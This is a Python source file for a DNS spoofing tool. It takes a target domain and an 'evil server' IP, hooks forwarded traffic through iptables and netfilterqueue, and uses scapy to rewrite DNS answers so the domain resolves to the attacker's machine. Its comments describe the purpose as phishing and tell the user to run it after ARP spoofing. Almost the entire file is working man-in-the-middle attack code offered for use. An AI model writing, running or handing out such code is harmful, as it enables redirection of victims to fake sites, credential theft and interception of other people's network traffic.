# coding=utf-8
#!/usr/bin/python

#
#▓█████▄  ███▄    █   ██████      ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  
#▒██▀ ██▌ ██ ▀█   █ ▒██    ▒    ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒
#░██   █▌▓██  ▀█ ██▒░ ▓██▄      ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒
#░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒     ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  
#░▒████▓ ▒██░   ▓██░▒██████▒▒   ▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒
# ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░
# ░ ▒  ▒ ░ ░░   ░ ▒░░ ░▒  ░ ░   ░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░
# ░ ░  ░    ░   ░ ░ ░  ░  ░     ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ 
#   ░             ░       ░           ░               ░ ░      ░ ░             ░  ░   ░     
# ░                                                                                         
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import pyfiglet
import argparse

def get_args():
    parser = argparse.ArgumentParser(
        description='DNS Spoofer')
    parser.add_argument(
        '-d', '--domain', type=str, help='Domain to spoof', required=True)
    parser.add_argument(
        '-s', '--server-ip', type=str, help='Evil server IP', required=True)
    args = parser.parse_args()
    DOMAIN = args.domain
    SERVER = args.server_ip
    return DOMAIN,SERVER

domain,server = get_args()

# DNS host records
dns_hosts = {
    "{0}.".format(domain) : "{0}".format(server),
}
print(dns_hosts)

def process_packet(packet):
    """
    Each time a new packet is redirected to the netfilter queue, this callback is called.
    """
    # convert a netfilter queue package into a scapy package
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # If it's a DNS Packet : we modify it
        print("\033[1;31m[BEFORE]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # No UDP packet, they can be IP/UDP error packets.
            pass
        print("\033[1;32m[AFTER]:", scapy_packet.summary())
        # returned as a netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()

def modify_packet(packet):
    """
    Modifies the DNS response to match our `dns_hosts` dictionary. 
    For example, when we get a response from google.com, 
    this function replaces the real IP address with a fake IP address (192.168.1.113).
    """
    
    # Get the domain name of the DNS request
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # If the site is not in our list of sites to phisher, we do not modify it
        print("\033[1;33m[-] NO MODIF", qname)
        return packet
    # create a new response, replacing the original response
    # set the rdata for the IP we want to redirect (spoofed)
    # google.com -> 192.168.40.113 (kali machine)
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the number of answers to 1
    packet[DNS].ancount = 1
    # remove the checksums and the length of the package, because we have modified the package
    # new calculations are needed (scapy will do it automatically)
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet



if __name__ == "__main__":
    print('\033[1;32m[+] Starting DNS Spoofing Program... \n[!] Pls, run it AFTER launching ARP Spoofing')
    f = open('banner.txt', 'r')
    header = f.read()
    print ('\033[1;31m' + header)
    header2 = pyfiglet.figlet_format("DNS Spoofer", font = "slant")
    print("\033[1;31m"+header2)
    print("© All credits to NextGenSpoofer  \n")
    print("[!!!] Don't forget to change the source code for dns_hosts (insert your malicious ip) or this won't work")
    QUEUE_NUM = 0
    # insert iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our `process_packet` callback
        # and run it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # end of the program, we do iptables flush
        os.system("iptables --flush")
        print("\033[1;31m[/!\] Closing program...")
